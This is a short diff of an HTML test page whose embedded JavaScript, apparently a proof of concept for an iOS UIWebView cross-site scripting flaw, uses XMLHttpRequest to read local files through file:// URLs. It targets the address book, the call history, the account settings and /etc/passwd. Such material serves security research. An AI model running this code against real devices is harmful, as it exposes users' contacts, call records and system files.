@@ -13,10 +13,13 @@
 <div>
 <textarea id="test" rows=10 cols=50>
     // http://ma.la/tmp/boxcar.js
-    //var file = 'file:///private/var/wireless/Library/CallHistory/call_history.db';
-    //var file = 'file:///private/var/mobile/Library/AddressBook/AddressBook.sqlitedb';
-    var file = 'file:///private/var/mobile/Library/Preferences/com.apple.accountsettings.plist';
-    
+//    var file = 'file:///var/mobile/Applications/284C68CB-8A1B-41EE-A5E9-DBEBBFA234BE/UIWebView+XSSSample.app/index.html';
+//    var file = 'file:///private/var/mobile/Library/AddressBook/AddressBook.sqlitedb';
+//    var file = 'file:///private/var/mobile/Library/Preferences/com.apple.accountsettings.plist';
+//var file = 'file:///hoge';
+
+var file = 'file:///private/etc/passwd';
+
     try {
       var req = new XMLHttpRequest;
       req.open("GET", file, true);
